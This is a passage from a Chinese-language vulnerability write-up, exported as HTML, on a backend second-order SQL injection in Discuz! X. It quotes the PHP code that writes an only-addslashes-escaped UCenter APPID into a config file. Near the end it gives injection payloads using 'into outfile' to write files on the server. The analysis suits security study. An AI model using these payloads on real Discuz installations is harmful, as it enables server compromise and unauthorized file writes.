&#39;&quot;.addslashes(UC_IP).&quot;&#39;)&quot;, &quot;define(&#39;UC_IP&#39;, &#39;&quot;.$settingnew[&#39;uc&#39;][&#39;ip&#39;].&quot;&#39;)&quot;, $configfile);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$configfile = str_replace(&quot;define(&#39;UC_APPID&#39;, &#39;&quot;.addslashes(UC_APPID).&quot;&#39;)&quot;, &quot;define(&#39;UC_APPID&#39;, &#39;&quot;.$settingnew[&#39;uc&#39;][&#39;appid&#39;].&quot;&#39;)&quot;, $configfile);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$fp = fopen(&#39;./config/config_ucenter.php&#39;, &#39;w&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!($fp = @fopen(&#39;./config/config_ucenter.php&#39;, &#39;w&#39;))) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cpmsg(&#39;uc_config_write_error&#39;, &#39;&#39;, &#39;error&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@fwrite($fp, trim($configfile)); // </span><span class="cs7FFD2630">写入到</span><span class="cs9FB05234">config_ucenter.php </span><span class="cs7FFD2630">可控</span><span class="cs9FB05234">UC_APPID </span><span class="cs7FFD2630">的值</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">通过上面代码可以看出来只简单的</span><span class="cs9FB05234">addslashes</span><span class="cs7FFD2630">了一下</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@fclose($fp);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;isset($settingnew[&#39;regname&#39;]) &amp;&amp; empty($settingnew[&#39;regname&#39;]) &amp;&amp; $settingnew[&#39;regname&#39;] = &#39;register&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;isset($settingnew[&#39;reglinkname&#39;]) &amp;&amp; empty($settingnew[&#39;reglinkname&#39;]) &amp;&amp; $settingnew[&#39;reglinkname&#39;] = cplang(&#39;reglinkname_default&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$nohtmlarray = array(&#39;bbname&#39;, &#39;regname&#39;, &#39;reglinkname&#39;, &#39;icp&#39;, &#39;sitemessage&#39;, &#39;site_qq&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;foreach($nohtmlarray as $k) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(isset($settingnew[$k])) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$settingnew[$k] = dhtmlspecialchars($settingnew[$k]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(isset($settingnew[&#39;statcode&#39;])) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$settingnew[&#39;statcode&#39;] = preg_replace(&#39;/language\s*=[\s|\&#39;|\&quot;]*php/is&#39;, &#39;_&#39;, $settingnew[&#39;statcode&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$settingnew[&#39;statcode&#39;] = str_replace(array(&#39;&lt;?&#39;, &#39;?&gt;&#39;), array(&#39;&lt;?&#39;, &#39;?&gt;&#39;), $settingnew[&#39;statcode&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">转义一次的字符串被写人文件中，在</span><span class="cs8926E06">PHP</span><span class="cs9C1B1871">解析时就是没有转义过的原始内容</span><span class="cs8926E06"> </span><span class="cs9C1B1871">造成了二次注入的产生</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">define(&#39;UC_APPID&#39;, &#39;sadsadsadasd\&#39;&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">printf(UC_APPID);</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X%20%e7%b3%bb%e5%88%97%e5%85%a8%e7%89%88%e6%9c%ac%20%e5%90%8e%e5%8f%b0Sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="222" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">漏洞验证</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X%20%e7%b3%bb%e5%88%97%e5%85%a8%e7%89%88%e6%9c%ac%20%e5%90%8e%e5%8f%b0Sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="557" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X%20%e7%b3%bb%e5%88%97%e5%85%a8%e7%89%88%e6%9c%ac%20%e5%90%8e%e5%8f%b0Sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="262" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X%20%e7%b3%bb%e5%88%97%e5%85%a8%e7%89%88%e6%9c%ac%20%e5%90%8e%e5%8f%b0Sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image3.png" width="560" height="255" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">直接构造语句</span></p><p class="cs3A447A38"><span class="cs9FB05234">1&#39; into outfile &#39;c:\\wamp64\\tmp\\1.txt&#39; &nbsp;-- a</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X%20%e7%b3%bb%e5%88%97%e5%85%a8%e7%89%88%e6%9c%ac%20%e5%90%8e%e5%8f%b0Sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image4.png" width="560" height="287" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X%20%e7%b3%bb%e5%88%97%e5%85%a8%e7%89%88%e6%9c%ac%20%e5%90%8e%e5%8f%b0Sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image5.png" width="560" height="432" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">构造报错注入</span></p><h3 class="cs868C439D">
			<a name="补充"><span class="csD6CA00D2">补充：</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs8926E06">UCenter </span><span class="cs9C1B1871">应用</span><span class="cs8926E06"> ID</span><span class="cs9C1B1871">填入</span><span class="cs8926E06">exp</span><span class="cs9C1B1871">，然后提交</span></p><p class="cs3A447A38"><span class="cs9FB05234">1&#39; union select &#39;abc&#39; &nbsp;into outfile &#39;c:\6.txt&#39; -- a</span></p></body>
</html>
